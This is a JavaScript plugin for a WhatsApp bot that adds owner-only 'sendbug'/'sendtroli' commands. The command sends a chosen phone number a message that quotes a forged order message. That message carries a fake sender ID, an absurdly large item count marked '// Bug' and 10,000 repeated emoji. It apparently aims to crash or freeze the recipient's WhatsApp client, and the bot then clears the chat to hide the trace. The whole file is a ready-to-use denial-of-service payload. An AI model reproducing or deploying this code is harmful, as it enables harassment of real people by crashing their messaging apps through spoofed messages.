// By Caliph
let handler = async (m, { conn, text, args, usedPrefix, command }) => {
let who
if (text) who = text.replace(/[^0-9]/g, '') + '@s.whatsapp.net'
else who = m.chat
conn.sendMessage(who, 'Hai Kak', 'conversation', {
 quoted: {
  key: {
  remoteJid: 'status@broadcast',
   participant: '0@s.whatsapp.net' // Fake sender Jid
  },
  message: {
   orderMessage: {
    itemCount: 999999999999999999999999999999999999, // Bug
    status: 1,
    surface: 1,
    message: '🔥'.repeat(10000),
    orderTitle: 'MAMPUS', // Idk what this does
    sellerJid: '0@s.whatsapp.net' // Seller
   }
  }
 }
}).then(v => conn.modifyChat(v.key.remoteJid, 'clear'))
}
handler.help = ['sendbug <nomor>', 'sendtroli <nomor>', 'sendtroli', 'sendbug']
handler.tags = ['host']
handler.command = /^(sendtroli|sendbug)$/i
handler.owner = true 

module.exports = handler
